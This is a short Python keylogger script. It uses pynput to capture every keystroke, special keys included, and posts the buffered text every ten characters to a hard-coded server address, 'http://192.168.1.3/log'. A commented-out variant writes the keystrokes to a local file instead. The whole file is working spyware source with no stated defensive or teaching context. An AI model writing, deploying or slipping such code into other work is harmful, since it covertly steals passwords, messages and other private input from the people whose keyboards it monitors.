import pynput.keyboard
import requests

SERVER_URL = "http://192.168.1.3/log"

log = ""

def send_logs():
    global log
    try:
        requests.post(SERVER_URL, data=log)
        log=""
    except requests.RequestException:
        pass

# def on_press(key):
#     try:
#         with open("keylog.txt", "a") as f:
#             f.write(str(key.char))
#     except AttributeError:
#         with open("keylog.txt", "a") as f:
#             f.write(f"[{key}]")

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
       log+= f"[{key}]"

    if len(log) >= 10:
        send_logs()

keyboard_listener = pynput.keyboard.Listener(on_press=on_press)

with keyboard_listener:
    keyboard_listener.join()